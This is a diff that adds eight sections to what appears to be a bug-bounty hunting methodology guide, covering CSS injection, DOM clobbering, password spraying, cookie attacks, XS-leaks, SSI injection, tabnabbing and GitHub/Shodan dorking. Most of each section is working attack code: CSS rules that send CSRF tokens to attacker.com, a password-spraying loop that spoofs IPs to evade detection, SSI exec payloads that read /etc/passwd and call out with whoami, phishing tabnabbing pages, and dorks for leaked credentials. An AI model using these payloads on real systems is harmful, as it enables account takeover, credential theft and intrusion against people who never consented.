@@ -880,6 +880,14 @@ Now that you've run through the basics, dive into the full methodology below. Ea
 | 4.40 | ↳ [HTTP/2 Attacks](#440-http2-specific-attacks) | HPACK Bomb · Stream Abuse · H2C Smuggling |
 | 4.41 | ↳ [Dependency Confusion](#441-dependency-confusion) | Supply Chain · Private Package Hijack · npm/PyPI |
 | 4.42 | ↳ [API Security Deep Dive](#442-api-security-deep-dive) | BOLA (All Methods) · Nested · UUID · Bulk · Cross-Role |
+| 4.43 | ↳ [CSS Injection & Exfiltration](#443-css-injection--data-exfiltration) | Token Steal via CSS · Font-Based Leak · No JS |
+| 4.44 | ↳ [DOM Clobbering](#444-dom-clobbering) | Override JS Globals · Bypass CSP · Deep Property Chains |
+| 4.45 | ↳ [Password Spraying](#445-password-spraying) | 1 Pass × N Users · Username Enum · Spray Windows |
+| 4.46 | ↳ [Cookie Attribute Attacks](#446-cookie-attribute-attacks) | Domain Override · Path Bypass · Cookie Tossing |
+| 4.47 | ↳ [XS-Leaks](#447-xs-leaks-cross-site-leaks) | Timing Oracle · Frame Count · Error Event · Cache Probe |
+| 4.48 | ↳ [SSI Injection](#448-ssi-injection-server-side-includes) | #exec cmd · #include file · Apache mod_include |
+| 4.49 | ↳ [Tabnabbing](#449-tabnabbing) | Background Tab Hijack · Reverse Tabnabbing · Phishing |
+| 4.50 | ↳ [GitHub & Shodan Dorking](#450-github-shodan--censys-dorking) | Source Leaks · Exposed Services · CI/CD Secrets |
 | 5 | [Hunting Mindset](#5-hunting-mindset--methodology) | Strategy · Prioritization · Pivoting |
 | 6 | [POC Creation](#6-proof-of-concept-poc-creation) | Screenshots · Scripts · Automation · Evidence |
 | 7 | [Reporting](#7-reporting) | Professional Write-ups |
@@ -4920,9 +4928,545 @@ api-v1.target.com     → deprecated, no security patches
 
 ---
 
-> *"Scanners find noise. Hunters find impact."*
+<br>
+
+### **4.43 CSS Injection & Data Exfiltration**
+
+> Extract CSRF tokens, email addresses, and hidden page content using CSS selectors — no JavaScript needed.
+
+**How It Works**
+```html
+<!-- Attacker injects CSS into the page via stored/reflected injection -->
+<style>
+  /* Steal CSRF token — every character triggers a different background image */
+  input[name="csrf"][value^="a"] { background: url(https://attacker.com/?c=a) }
+  input[name="csrf"][value^="b"] { background: url(https://attacker.com/?c=b) }
+  input[name="csrf"][value^="c"] { background: url(https://attacker.com/?c=c) }
+  /* ... a through z, 0 through 9 ... */
+</style>
+```
+
+**What Can Be Stolen via CSS**
+```css
+/* Hidden input values (CSRF tokens, auth tokens) */
+input[name="csrf"][value^="a"] { background: url(//collab/?a) }
+
+/* Page content — text between tags */
+div[data-secret^="a"] { background: url(//collab/?a) }
+
+/* User email in profile */
+input[value*="@"] { background: url(//collab/?has_at_sign) }
+
+/* Password auto-filled by browser */
+input[type="password"]:not([value=""]) { background: url(//collab/?autofilled) }
+
+/* Check if specific text exists on page */
+*:has(:contains("admin")) { background: url(//collab/?is_admin) }
+```
+
+**Full Exfiltration Script (generate CSS for all characters)**
+```python
+#!/usr/bin/env python3
+# Generate CSS payload to steal CSRF token character by character
+prefix = "input[name='csrf'][value"
+chars = "abcdefghijklmnopqrstuvwxyz0123456789"
+
+for c in chars:
+    print(f'{prefix}^="{c}"]{{background:url(https://collab/?{c})}}')
+for c in chars:
+    for c2 in chars:
+        print(f'{prefix}^="{c}{c2}"]{{background:url(https://collab/?{c}{c2})}}')
+# Inject into page via <style> tag → each matched char triggers HTTP request
+```
+
+**Font-Based Data Exfiltration (Chrome)**
+```html
+<style>
+@font-face { font-family: leak; src: url(https://attacker.com/?a); unicode-range: U+0061; }
+@font-face { font-family: leak; src: url(https://attacker.com/?b); unicode-range: U+0062; }
+/* ... all chars ... */
+body { font-family: leak; }
+</style>
+<!-- When font renders char 'a' → browser requests attacker/?a -->
+```
+
+**CSS Injection Entry Points**
+```bash
+# Any place that reflects CSS or accepts style parameters:
+# <style>NAME</style>
+# <link rel=stylesheet href=INPUT>
+# <div style="INPUT"> (inline style)
+# ?css=https://attacker.com/evil.css (style import)
+```
 
 ---
+
+### **4.44 DOM Clobbering**
+
+> Override JavaScript global variables via HTML `id` or `name` attributes — bypass CSP, hijack functions.
+
+**How It Works**
+```javascript
+// App code references: window.config.isAdmin
+// Attacker injects: <a id="config" name="isAdmin" href="file://true">
+// window.config.isAdmin.toString() → "file://true" → truthy → admin access!
+
+// App code: if (window.APP_CONFIG.apiUrl) { ... }
+// Attacker: <a id="APP_CONFIG" href="https://evil.com/api">
+// window.APP_CONFIG.apiUrl → "https://evil.com/api" → attacker's server
+```
+
+**Common Clobbering Targets**
+```html
+<!-- Override config objects -->
+<a id="config">          → window.config → HTMLAnchorElement (truthy)
+<a id="config" name="isAdmin" href="file://true"> → config.isAdmin = truthy
+
+<!-- Override script variables -->
+<script>
+var x = DEFAULT_VALUE || 1;   // DEFAULT_VALUE undefined → use 1
+</script>
+<!-- Now inject: <form id="DEFAULT_VALUE"> → DEFAULT_VALUE exists → used instead of 1 -->
+
+<!-- Clobber XSS filters -->
+<!-- If app has: if (!window.DOMPurify) { loadPurify(); } -->
+<!-- Inject: <img id="DOMPurify"> → DOMPurify exists → purifier NOT loaded! -->
+
+<!-- Clobber Array methods -->
+<form id="arr"><input name="0" value="first"><input name="1" value="second">
+<!-- window.arr[0] → "first" instead of actual array element -->
+```
+
+**Advanced: Deep Property Chains**
+```html
+<!-- Override: window.app.config.isAdmin -->
+<!-- Need 2 elements: one for "app", child for "config" -->
+<form id="app">
+  <output id="config">admin access</output>
+</form>
+<!-- window.app.config → <output> element → truthy -->
+```
+
+**Detection**
+```bash
+# Search for potentially clobberable patterns in JS:
+cat js_files.txt | grep -E "window\.\w+\.\w+|self\.\w+\.\w+|var \w+ = \w+ \|\|"
+
+# Check if HTML injection is possible (can inject tags with id/name)
+# If XSS blocked by CSP but HTML injection works → test DOM clobbering
+```
+
+---
+
+### **4.45 Password Spraying**
+
+> One password × many usernames. Opposite of brute force. Undetectable because each user gets 1 attempt.
+
+**Spraying vs Brute Force**
+```bash
+# Brute force (gets you locked/banned):
+# user1: pass1, pass2, pass3, ..., pass1000
+# user2: pass1, pass2, pass3, ..., pass1000
+
+# Password spraying (undetected):
+# pass1: user1, user2, user3, ..., user1000   ← 1 attempt per user
+# pass2: user1, user2, user3, ..., user1000   ← 1 attempt per user
+# pass3: user1, user2, user3, ..., user1000
+```
+
+**Username List Sources**
+```bash
+# 1. Email format discovery
+# Check LinkedIn, GitHub, company website for employee names
+# Format: first.last@, first@, f.last@, first_last@, flast@
+
+# 2. OSINT tools
+python3 linkedin2username.py company "Target Corp" -o users.txt
+theHarvester -d target.com -b linkedin,google -f users.html
+
+# 3. Enumerate from application behavior
+# Registration: "Username already exists" vs "Registration successful"
+# Login: "User not found" vs "Incorrect password"
+# Password reset: "No account found" vs "Email sent"
+
+# 4. Common username patterns
+# admin, administrator, root, test, dev, support, info, sales
+# firstname, firstname.lastname, firstname_lastname
+```
+
+**The Spray**
+```bash
+# Top 10 most common passwords for spraying:
+# Spring2024!, Winter2024!, Password1!, Welcome1!, Changeme1!
+# Company123!, Monday1!, target2024!, Summer2024!, Qwerty1!
+
+# Spray script:
+cat users.txt | while read user; do
+  curl -s -X POST https://target.com/login \
+    -d "username=$user&password=Spring2024!" \
+    -w "$user %{http_code}\n" -o /dev/null
+done | grep -v "401\|403"
+
+# If ANY return 200 or 302 → success! Valid credentials found.
+
+# Rotate IPs to avoid detection:
+cat users.txt | while read user; do
+  curl -s -H "X-Forwarded-For: $((RANDOM%255)).$((RANDOM%255)).$((RANDOM%255)).$((RANDOM%255))" \
+    -X POST https://target.com/login \
+    -d "username=$user&password=Summer2024!"
+done
+```
+
+**Spray Windows (avoid lockouts)**
+```bash
+# Check password policy first:
+# "Account locks after 5 attempts" → spray 4 users, wait, repeat
+# "Account locks after 3 attempts" → spray 2 users, wait, repeat
+
+# Time between sprays: 30-60 minutes
+# Use sleep: cat users.txt | while read u; do
+#   spray_command; sleep $((RANDOM % 60 + 30))
+# done
+```
+
+---
+
+### **4.46 Cookie Attribute Attacks**
+
+> Manipulate cookie Domain, Path, Secure, HttpOnly, and SameSite to hijack or inject cookies.
+
+**Domain Override**
+```bash
+# Cookie set for: .target.com (leading dot = all subdomains)
+# Attacker with XSS on sub.target.com can set cookie for .target.com
+# → Cookie sent to main app → session fixation/hijack
+
+# Attack: XSS on sub.target.com
+document.cookie = "session=ATTACKER_SESSION; domain=.target.com; path=/";
+# Victim visits target.com → uses attacker's session cookie → logged in as attacker
+
+# The attacker sees everything the victim does in attacker's account
+# → Victim enters credit card, address → stored in attacker's account
+```
+
+**Path Bypass**
+```bash
+# Cookie set for: /admin
+# Not sent to: /api/admin
+# But sent to: /admin/ → /adminanything
+
+# Cookie scope confusion:
+Set-Cookie: session=abc; Path=/admin
+# Test: GET /admin/../api/users → does cookie get sent?
+```
+
+**Subdomain Cookie Injection via CRLF**
+```bash
+# If CRLF injection exists in any response on target.com:
+# Inject: %0d%0aSet-Cookie:csrf=KNOWN_VALUE;%20domain=.target.com
+# Now ALL subdomains have attacker's CSRF token
+# Attacker performs CSRF with known token → bypasses CSRF protection
+```
+
+**Secure Flag Missing**
+```bash
+# Cookie missing Secure flag → transmitted over HTTP → intercepted via MITM
+# Check: Set-Cookie: session=abc (no Secure flag)
+# On HTTP pages: cookie sent in cleartext
+
+# HttpOnly Missing
+# Cookie missing HttpOnly → accessible via JavaScript → XSS can steal it
+document.cookie  // shows session=abc if no HttpOnly flag
+```
+
+**Cookie Tossing — Override Higher-Scope Cookie**
+```bash
+# Target sets: Set-Cookie: session=abc; Domain=target.com; Path=/
+# Attacker with XSS on sub.target.com sets:
+document.cookie = "session=ATTACKER; domain=target.com; path=/; SameSite=None; Secure";
+# Browser sends BOTH cookies → server may use the WRONG one
+# If server uses first/last inconsistently → session hijack
+```
+
+---
+
+### **4.47 XS-Leaks (Cross-Site Leaks)**
+
+> Leak data from another origin using side channels: timing, error events, frame counting, cache probing.
+
+**Timing Oracle**
+```javascript
+// Measure response time → infer if search result exists
+// "admin@target.com" → 200ms (user exists, rendered profile page)
+// "xxxxxx@target.com" → 50ms (user not found, rendered error quickly)
+
+async function probe(query) {
+  const start = performance.now();
+  await fetch(`https://target.com/search?q=${query}`, {mode: 'no-cors'});
+  const end = performance.now();
+  return end - start;  // Longer time = result exists → user enumeration
+}
+```
+
+**Frame Counting — Cross-Origin Object Count**
+```javascript
+// Iframes can count how many objects load on a cross-origin page
+// Leaks: number of search results, messages, followers, etc.
+
+<iframe src="https://target.com/search?q=admin" id="probe"></iframe>
+<script>
+probe.onload = () => {
+  // Count frames/windows/objects in the iframe
+  // Number reveals how much data exists for the query
+};
+</script>
+```
+
+**Error Event Oracle**
+```javascript
+// Check if a cross-origin resource loads or errors
+<img src="https://target.com/api/user/1/avatar" onload="exists()" onerror="notExists()">
+// onload → resource exists → user 1 has avatar → user 1 exists!
+// onerror → 404 → user doesn't exist
+
+// Script load oracle:
+<script src="https://target.com/api/export/user/1" onload="exists()" onerror="notExists()">
+```
+
+**Cache Probing — Detect Cached URLs**
+```javascript
+// Load resource → check if it was cached (fast) or fetched (slow)
+// Cached = user previously visited that page → leak browsing history
+// Not cached = user hasn't visited → different behavior
+```
+
+**Detectable XS-Leaks**
+```bash
+# 1. User enumeration via timing on /api/user/check?email=
+# 2. Search result count via frame counting
+# 3. Profile existence via image load/error
+# 4. Admin page access via cache probing
+# 5. File existence via error event on script/stylesheet import
+# 6. Group/team membership via frame counting
+```
+
+---
+
+### **4.48 SSI Injection (Server-Side Includes)**
+
+> When the server parses SSI directives (`.shtml`, `.stm`, Apache mod_include).
+
+**Detection**
+```bash
+# SSI directives use <!--#command param="value" -->
+<!--#echo var="DOCUMENT_NAME"-->    → shows filename
+<!--#echo var="DATE_LOCAL"-->       → shows server date/time
+<!--#echo var="HTTP_USER_AGENT"-->  → shows your UA
+
+# If ANY SSI directive is reflected → SSI is being parsed
+```
+
+**File Read**
+```html
+<!--#include file="/etc/passwd"-->
+<!--#include virtual="/etc/passwd"-->
+
+# Windows:
+<!--#include file="C:\windows\win.ini"-->
+```
+
+**Command Execution (if exec is enabled)**
+```html
+<!--#exec cmd="id"-->
+<!--#exec cmd="cat /etc/passwd"-->
+<!--#exec cmd="curl http://COLLAB/?x=$(whoami)"-->
+```
+
+**Directory Listing**
+```html
+<!--#exec cmd="ls -la /var/www/"-->
+```
+
+**Common SSI Injection Points**
+```bash
+# Any field reflected in SSI-parsed response:
+# - User-Agent, Referer headers (logged to .shtml pages)
+# - Comment fields on .shtml pages
+# - Error pages (often .shtml format)
+# - Search results on .stm/.shtm pages
+# - Contact forms that send confirmation to .shtml page
+# Check: Content-Type includes shtml or the URL ends in .shtml/.stm
+```
+
+**Limited SSI (if exec blocked, try include)**
+```html
+<!--#include virtual="/var/log/apache2/access.log"-->
+<!--#include file="../secret.txt"-->
+```
+
+---
+
+### **4.49 Tabnabbing**
+
+> Background tab changes content to a phishing page while user is away. Social engineering attack.
+
+**How It Works**
+```javascript
+// Window.opener reference persists when user navigates away
+// Attacker's page checks if user switched to another tab
+// If yes → redirect attacker's page to phishing clone
+
+// Attacker page:
+document.addEventListener('visibilitychange', () => {
+  if (document.hidden) {
+    // User switched away → wait, then replace with phishing page
+    setTimeout(() => {
+      window.location = 'https://attacker.com/fake-login.html';
+    }, 5000);
+  }
+});
+```
+
+**Tabnabbing PoC**
+```html
+<!-- Attacker's page (user visits this on target.com via open redirect or XSS) -->
+<html>
+<body>
+  <h2>Loading... Please wait</h2>
+  <script>
+  // Detect when user switches to another tab
+  document.addEventListener('visibilitychange', function() {
+    if (document.hidden) {
+      setTimeout(function() {
+        // Replace with fake login page that looks exactly like target.com
+        window.location = 'https://attacker.com/phishing/target-login-clone.html';
+      }, 3000);
+    }
+  });
+  </script>
+</body>
+</html>
+```
+
+**Reverse Tabnabbing**
+```html
+<!-- Target page opens attacker's page with target="_blank" -->
+<!-- Attacker's page can redirect the TARGET page via window.opener -->
+
+<!-- If target.com does: -->
+<a href="https://attacker.com" target="_blank">External Link</a>
+
+<!-- Attacker page code: -->
+<script>
+if (window.opener) {
+  window.opener.location = 'https://fake-target.com';  // Redirects target.com tab!
+}
+</script>
+<!-- User thinks they're still on target.com → enters credentials on phishing page -->
+
+# Fix: target="_blank" rel="noopener noreferrer" → prevents window.opener access
+```
+
+**Impact & Detection**
+```bash
+# Check if target.com uses target="_blank" without rel="noopener noreferrer"
+# → Reverse tabnabbing possible
+
+# Check if target.com is vulnerable to open redirect + tabnabbing chain:
+# → Victim clicks open redirect → lands on attacker page
+# → Attacker page detects victim switched tab
+# → Attacker page replaces itself with fake login
+# → Victim returns to what looks like target.com → enters credentials
+```
+
+---
+
+### **4.50 GitHub, Shodan & Censys Dorking**
+
+> Reconnaissance gold: find source leaks, exposed services, and internal infrastructure.
+
+**GitHub Dorking — Source Code Leaks**
+```bash
+# Search target's GitHub repos for secrets:
+# Do this via GitHub code search (not API — it's free and legal)
+
+# API keys & secrets
+"target.com" password OR secret OR token OR key
+"target.com" AKIA          # AWS keys
+"target.com" AIza          # GCP keys  
+"target.com" sk-           # OpenAI/Stripe keys
+"target.com" BEGIN RSA     # Private keys
+
+# Configuration files
+"target.com" filename:.env
+"target.com" filename:config.json
+"target.com" filename:credentials
+"target.com" filename:wp-config.php
+"target.com" filename:id_rsa
+"target.com" filename:.npmrc
+
+# Internal URLs
+"target.com" "dev." OR "staging." OR "internal." OR "admin."
+"target.com" "localhost" OR "127.0.0.1" OR "0.0.0.0"
+"target.com" "mongodb://" OR "mysql://" OR "postgres://" OR "redis://"
+
+# CI/CD secrets
+"target.com" "GITHUB_TOKEN" OR "NPM_TOKEN" OR "DOCKER_PASSWORD"
+"target.com" "pipeline" OR "jenkins" OR "circleci" OR "github-actions"
+```
+
+**Shodan Dorking — Exposed Services**
+```bash
+# Find ALL exposed assets for target company
+shodan search 'org:"Target Corp"' --fields ip_str,port,org,hostnames
+shodan search 'hostname:target.com' --fields ip_str,port,title
+
+# Specific service hunting:
+shodan search 'org:"Target Corp" port:22'           # SSH exposed
+shodan search 'org:"Target Corp" port:3306'         # MySQL exposed
+shodan search 'org:"Target Corp" port:27017'        # MongoDB exposed (no auth!)
+shodan search 'org:"Target Corp" port:6379'         # Redis exposed (no auth!)
+shodan search 'org:"Target Corp" port:9200'         # Elasticsearch exposed
+shodan search 'org:"Target Corp" product:"Jenkins"' # Jenkins exposed
+shodan search 'org:"Target Corp" "X-Powered-By"'    # Web tech exposed
+
+# SSL certificates — find domains:
+shodan search 'ssl:"target.com"' --fields ip_str,port,ssl.cert.subject.CN
+
+# Screenshots of login pages:
+shodan search 'org:"Target Corp" http.title:"login"' --fields ip_str,port,http.title
+```
+
+**Censys Dorking — Alternative Search Engine**
+```bash
+# Censys has different data than Shodan — use both
+censys search 'services.tls.certificates.leaf_data.subject.organization:"Target Corp"'
+censys search 'services.http.response.body:"target.com"'
+censys search 'autonomous_system.name:"TARGET-ASN"'
+
+# Find exposed S3 buckets:
+censys search 'services.http.response.body:"NoSuchBucket" and labels:aws'
+```
+
+**Automated Search Tools**
+```bash
+# Git-secrets scanner:
+git clone https://github.com/trufflesecurity/trufflehog
+trufflehog github --org=target-org --json > trufflehog_results.json
+
+# Shodan automation:
+shodan download target_results 'org:"Target Corp"'
+shodan parse target_results.json.gz --fields ip_str,port,product,org
+
+# GitDorker:
+python3 GitDorker.py -tf github_token.txt -q target.com -d dorks.txt -o results.txt
+```
+
+---
+
+## **5. Hunting Mindset & Methodology**
+
+> *"Scanners find noise. Hunters find impact."*
 
 ### **5.1 The Two-Eye Approach — Deepened**
 
